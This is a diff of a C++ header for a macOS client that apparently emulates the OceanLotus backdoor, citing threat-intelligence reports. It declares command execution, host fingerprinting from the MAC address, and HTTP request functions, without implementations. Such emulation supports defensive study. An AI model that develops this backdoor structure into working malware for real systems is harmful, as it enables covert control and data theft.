@@ -2,11 +2,18 @@
 #define ClientPP_hpp
 
 #include <chrono>
+#include <ctime>
 #include <iostream>
+#include <pwd.h>
 #include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
 #include <stdbool.h>
 #include <string>
 #include <thread>
+
+#include <CoreFoundation/CoreFoundation.h>
+#include <IOKit/IOKitLib.h>
 
 #include "dlfcn.h"
 #include "Communication.hpp"
@@ -14,6 +21,10 @@
 
 namespace client {
     extern const int RESP_BUFFER_SIZE;
+
+    std::string executeCmd(std::string cmd);
+
+    std::string getPlatformExpertDeviceValue(std::string key);
 }
 
 class ClientPP
@@ -24,15 +35,17 @@ public:
     May end up removing some if unneeded
     */
     std::string pathProcess;
-    int8_t      clientID[24];
+    uint8_t     clientID[24];
     std::string strClientID;
     int64_t     installTime;
-    void        *urlRequest;
-    int8_t      keyDecrypt[24];
-    int64_t     timeCheckRequestTimeout;
-    int         posDomain;
+    // void        *urlRequest;
+    // int8_t      keyDecrypt[24];
+    // int64_t     timeCheckRequestTimeout;
+    // int         posDomain;
     std::string domain;
-    int         count;
+    // int         count;
+
+    void *      dylib;
 
     /*
     osInfo
@@ -51,8 +64,9 @@ public:
             https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html
             https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/
         References:
+            https://pubs.opengroup.org/onlinepubs/009604499/functions/getpwuid.html
     */
-    static bool osInfo(int dwRandomTimeSleep);
+    static bool osInfo(int dwRandomTimeSleep, ClientPP * c);
 
     /*
     runClient
@@ -83,15 +97,14 @@ public:
                 - MAC address
                 - Randomly generated UUID
         Result:
-            int8_t - pointer to first value of the ID array
+            clientID updated for the provided ClientPP
         MITRE ATT&CK Techniques:
         CTI:
             https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
         References:
-            (?) https://developer.apple.com/documentation/iokit/iokitlib_h
-            (?) https://gist.github.com/JonnyJD/6126680
+            https://stackoverflow.com/a/54696457
     */
-    static int8_t createClientID();
+    static void createClientID(ClientPP * c);
 
     /*
     performHTTPRequest
@@ -108,6 +121,9 @@ public:
         References:
     */
     static std::vector<unsigned char> performHTTPRequest(void* dylib, std::string type, std::vector<unsigned char> data);
+
+    ~ClientPP();
+
 };
 
 
